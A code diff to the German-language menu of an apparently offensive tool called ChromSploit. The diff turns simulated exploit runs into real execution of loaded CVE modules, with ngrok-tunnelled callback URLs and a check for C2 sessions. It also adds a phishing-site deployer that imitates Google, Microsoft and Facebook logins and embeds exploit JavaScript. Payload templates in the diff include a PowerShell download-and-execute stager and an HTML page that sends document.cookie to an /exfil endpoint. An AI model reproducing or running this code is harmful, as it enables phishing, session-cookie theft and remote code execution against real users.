@@ -19,6 +19,8 @@ from core.config import Config
 from core.logger import Logger
 from core.utils import Utils
 from core.path_utils import PathUtils
+from core.ngrok_manager import get_ngrok_manager
+from core.module_loader import get_module_loader
 
 class CVEMenu(Menu):
     """
@@ -49,6 +51,7 @@ class CVEMenu(Menu):
         self.add_item("Payload generieren", self._generate_payload, Colors.BRIGHT_YELLOW)
         self.add_item("C2-Framework integrieren", self._integrate_c2, Colors.BRIGHT_MAGENTA)
         self.add_item("Exploit obfuskieren", self._obfuscate_exploit, Colors.BRIGHT_CYAN)
+        self.add_item("Phishing-Website bereitstellen", self._deploy_phishing, Colors.BRIGHT_GREEN)
         self.add_item("Exploit testen (Simulation)", self._test_exploit, Colors.BRIGHT_WHITE)
         self.add_item("Exploit-Paket exportieren", self._export_package, Colors.ORANGE)
         self.add_item("Exploit-Dokumentation anzeigen", self._show_documentation, Colors.PURPLE)
@@ -78,6 +81,98 @@ class CVEMenu(Menu):
                 "Edge WebAssembly JIT Escape (CVE-2025-30397): Ausnutzung einer Schwachstelle im WebAssembly-JIT-Compiler von Edge, "
                 "die es ermöglicht, Bounds-Checks zu umgehen und Heap-Corruption zu verursachen."
             )
+    
+    def _get_ngrok_url(self, protocol: str = "https") -> str:
+        """
+        Get the first available ngrok tunnel URL of the specified protocol
+        
+        Args:
+            protocol: The protocol to look for (http/https/tcp)
+            
+        Returns:
+            str: The ngrok URL or a placeholder if none found
+        """
+        try:
+            ngrok_manager = get_ngrok_manager()
+            tunnels = ngrok_manager.get_active_tunnels()
+            
+            for tunnel in tunnels:
+                if tunnel.public_url.startswith(protocol):
+                    return tunnel.public_url
+                    
+            # If no specific protocol found, return the first tunnel
+            if tunnels:
+                return tunnels[0].public_url
+                
+        except Exception as e:
+            print(f"{Colors.YELLOW}[!] Konnte ngrok-Status nicht abrufen: {str(e)}{Colors.RESET}")
+        
+        # Fallback to manual input
+        manual_url = input(f"\n{Colors.BRIGHT_CYAN}Bitte geben Sie die ngrok-URL ein: {Colors.RESET}")
+        return manual_url if manual_url else "https://placeholder.ngrok.io"
+    
+    def _execute_cve_exploit(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Execute the actual CVE exploit
+        
+        Args:
+            parameters: Exploit parameters
+            
+        Returns:
+            Dict with execution results
+        """
+        try:
+            # Load the exploit module
+            module_loader = get_module_loader()
+            exploit_module = module_loader.load_module(f"exploits.{self.cve_id}")
+            
+            if not exploit_module:
+                return {
+                    'success': False,
+                    'error': f"Could not load exploit module for {self.cve_id}"
+                }
+            
+            # Check if in simulation mode
+            if parameters.get('simulation_mode', False):
+                print(f"{Colors.YELLOW}[!] Simulation mode active - no actual exploitation{Colors.RESET}")
+                return {
+                    'success': True,
+                    'cve_id': self.cve_id,
+                    'simulated': True,
+                    'message': 'Exploit would be executed in real mode'
+                }
+            
+            # Execute the exploit
+            if hasattr(exploit_module, 'execute_exploit'):
+                result = exploit_module.execute_exploit(parameters)
+            else:
+                # Try to instantiate the exploit class and execute
+                exploit_class_name = f"CVE{self.cve_id.split('_')[1]}_{self.cve_id.split('_')[2]}_Exploit"
+                if hasattr(exploit_module, exploit_class_name):
+                    exploit_class = getattr(exploit_module, exploit_class_name)
+                    exploit = exploit_class()
+                    
+                    # Set parameters
+                    for key, value in parameters.items():
+                        if hasattr(exploit, 'set_parameter'):
+                            exploit.set_parameter(key, value)
+                    
+                    # Execute
+                    result = exploit.execute(parameters.get('target_url'))
+                else:
+                    return {
+                        'success': False,
+                        'error': f"No executable exploit found in module {self.cve_id}"
+                    }
+            
+            return result
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Exploit execution failed: {str(e)}{Colors.RESET}")
+            return {
+                'success': False,
+                'error': str(e)
+            }
     
     def _quick_exploit(self) -> None:
         """
@@ -115,25 +210,88 @@ class CVEMenu(Menu):
         
         print(f"\n{Colors.CYAN}[*] Starte Exploit-Ausführung mit automatischer Konfiguration...{Colors.RESET}")
         
-        # Hier würde die eigentliche Exploit-Ausführung implementiert werden
-        steps = [
-            ("Payload generieren", 2),
-            ("C2-Framework konfigurieren", 1),
-            ("Exploit vorbereiten", 1),
-            ("Ngrok-Tunnel einrichten", 2),
-            ("Exploit ausführen", 3)
-        ]
+        # Prepare exploit parameters
+        exploit_params = {
+            'kali_ip': Utils.get_ip_address(),
+            'port': config.get('listen_port', 8443),
+            'target_url': config.get('target_url', 'http://target.local'),
+            'callback_url': self._get_ngrok_url() if config.get('use_ngrok') else f"http://{Utils.get_ip_address()}:{config.get('listen_port', 8443)}",
+            'simulation_mode': False  # Set to True for testing
+        }
         
-        for step, duration in steps:
-            print(f"{Colors.BLUE}[+] {step}...{Colors.RESET}")
-            time.sleep(duration)
-            print(f"{Colors.GREEN}[✓] {step} abgeschlossen{Colors.RESET}")
+        # Execute the actual exploit
+        print(f"{Colors.BLUE}[+] Lade Exploit-Modul...{Colors.RESET}")
+        result = self._execute_cve_exploit(exploit_params)
         
-        print(f"\n{Colors.BRIGHT_GREEN}[✓] Exploit erfolgreich ausgeführt!{Colors.RESET}")
-        print(f"\n{Colors.BRIGHT_WHITE}Ergebnisse:{Colors.RESET}")
-        print(f"  {Colors.GREEN}Payload:{Colors.RESET} /home/ubuntu/ChromSploit/output/{self.cve_id}/payload.ps1")
-        print(f"  {Colors.GREEN}C2-URL:{Colors.RESET} https://8a4f-203-0-113-195.ngrok.io")
-        print(f"  {Colors.GREEN}Listener:{Colors.RESET} Aktiv auf Port 8443")
+        if result.get('success'):
+            print(f"{Colors.GREEN}[✓] Exploit erfolgreich geladen{Colors.RESET}")
+            
+            # Display results
+            print(f"\n{Colors.BRIGHT_GREEN}[✓] Exploit erfolgreich ausgeführt!{Colors.RESET}")
+            print(f"\n{Colors.BRIGHT_WHITE}Ergebnisse:{Colors.RESET}")
+            
+            if 'payload_path' in result:
+                print(f"  {Colors.GREEN}Payload:{Colors.RESET} {result['payload_path']}")
+            
+            if 'server_url' in result:
+                print(f"  {Colors.GREEN}Server URL:{Colors.RESET} {result['server_url']}")
+            
+            print(f"  {Colors.GREEN}C2-URL:{Colors.RESET} {exploit_params['callback_url']}")
+            
+            if 'instructions' in result:
+                print(f"\n{Colors.BRIGHT_YELLOW}Anweisungen:{Colors.RESET}")
+                for instruction in result['instructions']:
+                    print(f"  {Colors.YELLOW}• {instruction}{Colors.RESET}")
+            
+            # Save artifacts
+            if 'artifacts' in result:
+                artifacts_dir = os.path.join(PathUtils.get_output_dir(), self.cve_id, "artifacts")
+                PathUtils.ensure_dir_exists(artifacts_dir)
+                for name, data in result.get('artifacts', {}).items():
+                    artifact_path = os.path.join(artifacts_dir, name)
+                    with open(artifact_path, 'w') as f:
+                        json.dump(data, f, indent=2)
+                    print(f"  {Colors.GREEN}Artifact saved:{Colors.RESET} {artifact_path}")
+            
+            # Check for new sessions if exploit was successful
+            print(f"\n{Colors.CYAN}[*] Prüfe auf neue Sessions...{Colors.RESET}")
+            time.sleep(2)
+            
+            try:
+                from modules.session_manager import get_session_manager
+                session_manager = get_session_manager()
+                
+                # Get current sessions
+                current_sessions = session_manager.get_all_sessions()
+                active_count = len(current_sessions)
+                
+                if active_count > 0:
+                    print(f"{Colors.GREEN}[+] {active_count} aktive Session(s) gefunden!{Colors.RESET}")
+                    
+                    # Show recent sessions
+                    print(f"\n{Colors.CYAN}Neueste Sessions:{Colors.RESET}")
+                    for session in current_sessions[:3]:  # Show max 3 sessions
+                        session_key = f"{session.framework}_{session.id}"
+                        user_host = f"{session.username}@{session.hostname}"
+                        print(f"  • {Colors.YELLOW}{session_key}{Colors.RESET} - {user_host} ({session.target_ip})")
+                    
+                    # Ask if user wants to open session management
+                    open_sessions = input(f"\n{Colors.BRIGHT_CYAN}Session Management öffnen? [J/n]: {Colors.RESET}")
+                    if open_sessions.lower() not in ['n', 'nein', 'no']:
+                        try:
+                            from ui.session_menu import SessionMenu
+                            session_menu = SessionMenu()
+                            session_menu.run()
+                        except ImportError:
+                            print(f"{Colors.YELLOW}[!] Session Management Menu nicht verfügbar{Colors.RESET}")
+                else:
+                    print(f"{Colors.YELLOW}[!] Keine aktiven Sessions gefunden{Colors.RESET}")
+                    print(f"{Colors.CYAN}[*] Stellen Sie sicher, dass C2-Frameworks laufen und auf Callbacks warten{Colors.RESET}")
+                    
+            except Exception as e:
+                print(f"{Colors.YELLOW}[!] Session-Check nicht verfügbar: {str(e)}{Colors.RESET}")
+        else:
+            print(f"{Colors.RED}[!] Exploit fehlgeschlagen: {result.get('error', 'Unknown error')}{Colors.RESET}")
         
         input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
     
@@ -252,10 +410,12 @@ class CVEMenu(Menu):
         
         print(f"\n{Colors.BRIGHT_GREEN}[✓] Exploit erfolgreich ausgeführt!{Colors.RESET}")
         print(f"\n{Colors.BRIGHT_WHITE}Ergebnisse:{Colors.RESET}")
-        print(f"  {Colors.GREEN}Payload:{Colors.RESET} /home/ubuntu/ChromSploit/output/{self.cve_id}/payload.{payload.lower()}")
+        payload_path = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"payload.{payload.lower()}")
+        print(f"  {Colors.GREEN}Payload:{Colors.RESET} {payload_path}")
         
         if use_ngrok:
-            print(f"  {Colors.GREEN}C2-URL:{Colors.RESET} https://8a4f-203-0-113-195.ngrok.io")
+            ngrok_url = self._get_ngrok_url()
+            print(f"  {Colors.GREEN}C2-URL:{Colors.RESET} {ngrok_url}")
         else:
             print(f"  {Colors.GREEN}C2-URL:{Colors.RESET} http://{Utils.get_ip_address()}:8443")
         
@@ -340,20 +500,23 @@ class CVEMenu(Menu):
         print(f"\n{Colors.CYAN}[*] Generiere Payload mit den angegebenen Parametern...{Colors.RESET}")
         time.sleep(2)
         
+        # Get ngrok URL for payload
+        c2_url = self._get_ngrok_url() if use_c2 else "http://127.0.0.1:8443"
+        
         # Beispielhafte Payload-Generierung
         if extension == "ps1":
-            payload_content = """
+            payload_content = f"""
 # ChromSploit Framework v2.0 - PowerShell Payload
-# Generiert für CVE-2025-4664
+# Generiert für {self.cve_id.upper()}
 $ErrorActionPreference = "SilentlyContinue"
-$url = "https://8a4f-203-0-113-195.ngrok.io/callback"
+$url = "{c2_url}/callback"
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 $data = $wc.DownloadString($url)
 Invoke-Expression $data
 """
         elif extension == "html":
-            payload_content = """
+            payload_content = f"""
 <!DOCTYPE html>
 <html>
 <head>
@@ -365,17 +528,17 @@ Invoke-Expression $data
     <p>Loading secure content...</p>
     <script>
         // ChromSploit Framework v2.0 - HTML Exploit
-        // Generiert für CVE-2025-4664
-        fetch('https://8a4f-203-0-113-195.ngrok.io/exfil', {
+        // Generiert für {self.cve_id.upper()}
+        fetch('{c2_url}/exfil', {{
             method: 'POST',
-            headers: {
+            headers: {{
                 'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
+            }},
+            body: JSON.stringify({{
                 'data': document.cookie,
                 'url': window.location.href
-            })
-        });
+            }})
+        }});
     </script>
 </body>
 </html>
@@ -451,6 +614,9 @@ Invoke-Expression $data
         use_ngrok = input(f"\n{Colors.BRIGHT_CYAN}Ngrok für externe Erreichbarkeit verwenden? [J/n]: {Colors.RESET}")
         use_ngrok = use_ngrok.lower() not in ['n', 'nein', 'no']
         
+        # Get ngrok URL if using ngrok
+        ngrok_url = self._get_ngrok_url() if use_ngrok else "http://127.0.0.1:8443"
+        
         # Hier würde die eigentliche C2-Integration implementiert werden
         print(f"\n{Colors.CYAN}[*] Starte {c2_name} mit den angegebenen Parametern...{Colors.RESET}")
         
@@ -464,15 +630,16 @@ Invoke-Expression $data
             if use_ngrok:
                 print(f"{Colors.BLUE}[+] Starte Ngrok-Tunnel für Port {port}...{Colors.RESET}")
                 time.sleep(2)
-                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: https://8a4f-203-0-113-195.ngrok.io{Colors.RESET}")
+                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: {ngrok_url}{Colors.RESET}")
             
             print(f"\n{Colors.GREEN}[✓] Sliver C2 erfolgreich konfiguriert!{Colors.RESET}")
             print(f"\n{Colors.BRIGHT_WHITE}Sliver C2 Informationen:{Colors.RESET}")
             print(f"  {Colors.GREEN}Listener:{Colors.RESET} Aktiv auf Port {port}")
-            print(f"  {Colors.GREEN}Implant:{Colors.RESET} /home/ubuntu/ChromSploit/output/{self.cve_id}/sliver_implant.{payload.lower()}")
+            payload_path = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"sliver_implant.{payload.lower()}")
+            print(f"  {Colors.GREEN}Implant:{Colors.RESET} {payload_path}")
             
             if use_ngrok:
-                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} https://8a4f-203-0-113-195.ngrok.io")
+                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {ngrok_url}")
             else:
                 print(f"  {Colors.GREEN}Lokale URL:{Colors.RESET} https://{Utils.get_ip_address()}:{port}")
         
@@ -485,15 +652,16 @@ Invoke-Expression $data
             if use_ngrok:
                 print(f"{Colors.BLUE}[+] Starte Ngrok-Tunnel für Port {port}...{Colors.RESET}")
                 time.sleep(2)
-                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: https://8a4f-203-0-113-195.ngrok.io{Colors.RESET}")
+                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: {ngrok_url}{Colors.RESET}")
             
             print(f"\n{Colors.GREEN}[✓] Metasploit Framework erfolgreich konfiguriert!{Colors.RESET}")
             print(f"\n{Colors.BRIGHT_WHITE}Metasploit Informationen:{Colors.RESET}")
             print(f"  {Colors.GREEN}Handler:{Colors.RESET} Aktiv auf Port {port}")
-            print(f"  {Colors.GREEN}Payload:{Colors.RESET} /home/ubuntu/ChromSploit/output/{self.cve_id}/metasploit_payload.{payload.lower()}")
+            payload_path = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"metasploit_payload.{payload.lower()}")
+            print(f"  {Colors.GREEN}Payload:{Colors.RESET} {payload_path}")
             
             if use_ngrok:
-                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} https://8a4f-203-0-113-195.ngrok.io")
+                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {ngrok_url}")
             else:
                 print(f"  {Colors.GREEN}Lokale URL:{Colors.RESET} https://{Utils.get_ip_address()}:{port}")
         
@@ -506,27 +674,28 @@ Invoke-Expression $data
             if use_ngrok:
                 print(f"{Colors.BLUE}[+] Starte Ngrok-Tunnel für Port {port}...{Colors.RESET}")
                 time.sleep(2)
-                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: https://8a4f-203-0-113-195.ngrok.io{Colors.RESET}")
+                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: {ngrok_url}{Colors.RESET}")
             
             print(f"\n{Colors.GREEN}[✓] Custom HTTP C2 erfolgreich konfiguriert!{Colors.RESET}")
             print(f"\n{Colors.BRIGHT_WHITE}HTTP C2 Informationen:{Colors.RESET}")
             print(f"  {Colors.GREEN}Server:{Colors.RESET} Aktiv auf Port {port}")
-            print(f"  {Colors.GREEN}Payload:{Colors.RESET} /home/ubuntu/ChromSploit/output/{self.cve_id}/http_c2_payload.{payload.lower()}")
+            payload_path = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"http_c2_payload.{payload.lower()}")
+            print(f"  {Colors.GREEN}Payload:{Colors.RESET} {payload_path}")
             
             if use_ngrok:
-                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} https://8a4f-203-0-113-195.ngrok.io")
+                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {ngrok_url}")
             else:
                 print(f"  {Colors.GREEN}Lokale URL:{Colors.RESET} http://{Utils.get_ip_address()}:{port}")
         
         elif choice == "4":  # Ngrok Tunnel
             print(f"{Colors.BLUE}[+] Starte Ngrok-Tunnel für Port {port}...{Colors.RESET}")
             time.sleep(2)
-            print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: https://8a4f-203-0-113-195.ngrok.io{Colors.RESET}")
+            print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: {ngrok_url}{Colors.RESET}")
             
             print(f"\n{Colors.GREEN}[✓] Ngrok Tunnel erfolgreich konfiguriert!{Colors.RESET}")
             print(f"\n{Colors.BRIGHT_WHITE}Ngrok Informationen:{Colors.RESET}")
             print(f"  {Colors.GREEN}Lokaler Port:{Colors.RESET} {port}")
-            print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} https://8a4f-203-0-113-195.ngrok.io")
+            print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {ngrok_url}")
         
         input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
     
@@ -619,6 +788,120 @@ Invoke-Expression $data
         
         print(f"  {Colors.GREEN}Originalgröße:{Colors.RESET} {Utils.format_bytes(original_size)}")
         print(f"  {Colors.GREEN}Obfuskierte Größe:{Colors.RESET} {Utils.format_bytes(obfuscated_size)}")
+        
+        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
+    
+    def _deploy_phishing(self) -> None:
+        """
+        Deploy phishing website with embedded exploit
+        """
+        self._clear()
+        self._draw_box(80, f"PHISHING-WEBSITE BEREITSTELLEN - {self.cve_id.upper()}")
+        
+        print(f"\n{Colors.BRIGHT_WHITE}Phishing-Website mit Exploit-Integration{Colors.RESET}\n")
+        
+        # Template selection
+        print(f"{Colors.BRIGHT_BLUE}Wählen Sie ein Phishing-Template:{Colors.RESET}")
+        templates = {
+            "1": ("Google Login", "google"),
+            "2": ("Microsoft Login", "microsoft"),
+            "3": ("Facebook Login", "facebook"),
+            "4": ("Generic Portal", "generic"),
+            "5": ("Document Viewer", "document")
+        }
+        
+        for key, (name, _) in templates.items():
+            print(f"  {key}) {name}")
+        
+        choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das Template [1]: {Colors.RESET}")
+        template_name, template_key = templates.get(choice, templates["1"])
+        
+        # Port configuration
+        port = input(f"\n{Colors.BRIGHT_CYAN}Port für Phishing-Server [8080]: {Colors.RESET}")
+        port = int(port) if port else 8080
+        
+        # Get callback URL
+        use_ngrok = input(f"\n{Colors.BRIGHT_CYAN}Ngrok für externe Erreichbarkeit verwenden? [J/n]: {Colors.RESET}")
+        use_ngrok = use_ngrok.lower() not in ['n', 'nein', 'no']
+        
+        if use_ngrok:
+            callback_url = self._get_ngrok_url()
+        else:
+            callback_url = f"http://{Utils.get_ip_address()}:{port}"
+        
+        print(f"\n{Colors.CYAN}[*] Generiere Phishing-Website...{Colors.RESET}")
+        
+        try:
+            # Import phishing generator
+            from modules.phishing_generator import get_phishing_generator
+            phishing_gen = get_phishing_generator()
+            
+            # Load exploit payload
+            exploit_params = {
+                'kali_ip': Utils.get_ip_address(),
+                'port': port,
+                'callback_url': callback_url,
+                'target_url': 'http://target.local'
+            }
+            
+            # Get exploit JavaScript
+            exploit_result = self._execute_cve_exploit(exploit_params)
+            
+            if exploit_result.get('success'):
+                # Default exploit JavaScript if not provided
+                exploit_js = exploit_result.get('javascript_payload', f"""
+                function runExploit() {{
+                    console.log('[{self.cve_id.upper()}] Exploit triggered');
+                    // Exploit code would be injected here
+                    fetch('{callback_url}/exploit-trigger', {{
+                        method: 'POST',
+                        headers: {{'Content-Type': 'application/json'}},
+                        body: JSON.stringify({{
+                            exploit: '{self.cve_id}',
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent
+                        }})
+                    }});
+                }}
+                """)
+            else:
+                exploit_js = "console.log('Exploit payload not available');"
+            
+            # Deploy phishing site
+            result = phishing_gen.deploy_phishing_site(
+                template=template_key,
+                exploit_payload=exploit_js,
+                callback_url=callback_url,
+                port=port
+            )
+            
+            if result['success']:
+                print(f"{Colors.GREEN}[✓] Phishing-Website erfolgreich generiert!{Colors.RESET}")
+                print(f"\n{Colors.BRIGHT_WHITE}Bereitstellungsinformationen:{Colors.RESET}")
+                print(f"  {Colors.GREEN}Datei:{Colors.RESET} {result['filepath']}")
+                print(f"  {Colors.GREEN}URL:{Colors.RESET} {result['url']}")
+                print(f"  {Colors.GREEN}Server-Skript:{Colors.RESET} {result['server_script']}")
+                
+                if use_ngrok:
+                    print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {callback_url}")
+                
+                print(f"\n{Colors.BRIGHT_YELLOW}Anweisungen:{Colors.RESET}")
+                for instruction in result['instructions']:
+                    print(f"  {Colors.YELLOW}• {instruction}{Colors.RESET}")
+                
+                # Option to start server immediately
+                start_now = input(f"\n{Colors.BRIGHT_CYAN}Server jetzt starten? [J/n]: {Colors.RESET}")
+                if start_now.lower() not in ['n', 'nein', 'no']:
+                    print(f"\n{Colors.CYAN}[*] Starte Phishing-Server auf Port {port}...{Colors.RESET}")
+                    print(f"{Colors.YELLOW}[!] Drücken Sie Ctrl+C zum Beenden{Colors.RESET}")
+                    subprocess.Popen([sys.executable, result['server_script']])
+                    time.sleep(2)
+                    print(f"\n{Colors.GREEN}[✓] Server läuft: {result['url']}{Colors.RESET}")
+            else:
+                print(f"{Colors.RED}[!] Fehler beim Generieren der Phishing-Website: {result.get('error')}{Colors.RESET}")
+                
+        except Exception as e:
+            print(f"{Colors.RED}[!] Fehler: {str(e)}{Colors.RESET}")
         
         input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
     
